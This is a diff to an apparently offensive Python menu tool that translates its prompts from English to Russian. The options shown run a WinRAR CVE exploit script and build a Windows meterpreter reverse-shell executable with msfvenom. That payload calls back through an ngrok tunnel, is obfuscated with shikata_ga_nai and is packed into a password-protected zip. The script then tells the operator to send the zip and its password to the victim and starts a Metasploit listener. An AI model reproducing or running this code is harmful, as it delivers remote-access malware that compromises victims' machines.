@@ -174,32 +174,28 @@ if query in ["13"]:
 	CVE = ("cd && cd X-TOOL && ./evilWinRAR.py -e ") + (Evil_file) + (" -g ") + (Good_files)
 	os.system(CVE)
 if query in ["14"]:
-	print("Drop Required Files to Zip in home folder!")
-	File = input("Enter File Name What You want in Password Zip(/home folder)!:")
-	ZipFile = input("Enter File Name of Zip what you want(Dont forget .zip)!:")
-	ZipPassword = input("Enter What Password for Zip you want!:")
+	print("Вставьте нужные вам файлы в домашнию директорию(/home)!")
+	File = input("Введите название файла которой будет помещён в архив(/home)!:")
+	ZipFile = input("Введите название архива которого вы хотите создать(Не забудьте .zip)!:")
+	ZipPassword = input("Введите пароль который вы хотите поставить на архив!:")
 	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (File)
 	os.system(PassedZip)
-	print("You Got Zip file in home folder!")
+	print("Ваш архив находится в домашней директории!")
 if query in ["15"]:
 	print('')
-	print('Open another terminal and start Ngrok with tcp port 4444 (ngrok tcp 4444)')
-	NgrokPort = input('Write Ngrok Port!:')
-	PayloadFile = input('What name of file you want? (Dont forget to write .exe):')
-	
-
+	print('Откройте другой терминал и запустите Ngrok(ngrok tcp 4444)')
+	NgrokPort = input('Введите порт Ngrok!:')
+	PayloadFile = input('Введите название вредосного файла(Не забудьте .exe)!:')
 	msfvenom = ('cd && msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=') + (NgrokPort) + (' -b "\\x00" -e x86/shikata_ga_nai -f exe -o') + (PayloadFile)
 	os.system(msfvenom)
-	postgresql = ('service postgresql start')
-	os.system(postgresql)
-
-
 	ZipFile = input("Enter File Name of Zip what you want(Dont forget .zip)!:")
 
-	ZipPassword = input("Enter What Password for Zip you want!:")
+	File = input("Введите название файла которой будет помещён в архив(/home)!:")
+	ZipFile = input("Введите название архива которого вы хотите создать(Не забудьте .zip)!:")
+	ZipPassword = input("Введите пароль который вы хотите поставить на архив!:")
 	PassedZip = ("cd && zip --password ") + (ZipPassword) + (" ") + (ZipFile) + (" ") + (PayloadFile)
 	os.system(PassedZip)
-	print("Drop Zip to Victim Machine and say Password for Zip!")
+	print("Ваш архив находится в домашней директории! Отправьте его и скажите жетве пароль от него!")
 	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
 	os.system(msfMeter)
 if query in ["16"]:
@@ -209,4 +205,4 @@ if query in ["16"]:
 
 else:
 	print('')
-	print('[X] Sorry, You didnt choose options!')
+	print('[X] Извините, Вы не выброли действие!')
